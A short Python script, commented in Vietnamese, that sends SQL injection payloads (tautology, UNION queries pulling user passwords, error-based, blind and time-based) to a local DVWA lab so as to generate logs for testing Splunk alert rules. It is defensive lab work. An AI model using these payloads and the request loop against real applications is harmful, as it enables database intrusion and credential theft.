import requests
import time
import random

# Cấu hình mục tiêu (Local DVWA của bạn)
TARGET_URL = "http://localhost:8080/vulnerabilities/sqli/"

# ĐIỀN PHPSESSID LẤY TỪ TRÌNH DUYỆT CỦA BẠN VÀO ĐÂY
COOKIES = {
    "PHPSESSID": "278ab58002dbd5f0e20387685d3f6a8e", 
    "security": "low"
}

# Tổng hợp các Method SQLi khác nhau
PAYLOADS = [
    # 1. Tautology / Cổ điển
    "' OR '1'='1",
    "admin' #",
    
    # 2. UNION-based (Kéo dữ liệu)
    "' UNION SELECT null, null #",
    "' UNION SELECT user, password FROM users #",
    
    # 3. Error-based (Ép văng lỗi SQL)
    "' AND EXTRACTVALUE(1, CONCAT(0x7e, @@version)) #",
    "1' AND (SELECT 1/0) #",
    
    # 4. Boolean/Blind (Quét cấu trúc)
    "1' AND (LENGTH(database())) = 4 #",
    "1' AND SUBSTRING((SELECT database()),1,1) = 'd' #",
    
    # 5. Time-based (Ép DB ngủ)
    "1' AND (SELECT * FROM (SELECT(SLEEP(2)))a) #",
    "1'; WAITFOR DELAY '0:0:2'--"
]

print(f"Bắt đầu Spam Scan SQLi vào {TARGET_URL} để sinh Log cho Splunk...\n")

for payload in PAYLOADS:
    # Cấu trúc tham số (id=...&Submit=Submit). Thư viện requests sẽ tự động URL-encode payload.
    params = {
        "id": payload, 
        "Submit": "Submit"
    }
    
    try:
        print(f"[*] Đang gửi: {payload}")
        # Gửi GET request
        response = requests.get(TARGET_URL, params=params, cookies=COOKIES)
        
        # Chỉ check nếu đúng 200 OK (nghĩa là không bị đẩy về trang login)
        if response.status_code == 200:
            print(f"    [+] Thành công (HTTP 200)")
        else:
            print(f"    [-] Lỗi hoặc bị Redirect (HTTP {response.status_code}). Hãy kiểm tra lại PHPSESSID!")
            
    except Exception as e:
        print(f"    [!] Mất kết nối: {e}")
    
    # Tạm nghỉ 0.5s đến 1.5s giữa các request (để khớp với ngưỡng nhận diện của Rules Splunk)
    time.sleep(random.uniform(0.5, 1.5))

print("\nHoàn tất! Hãy lên Splunk và chạy Rule Alert để kiểm tra.")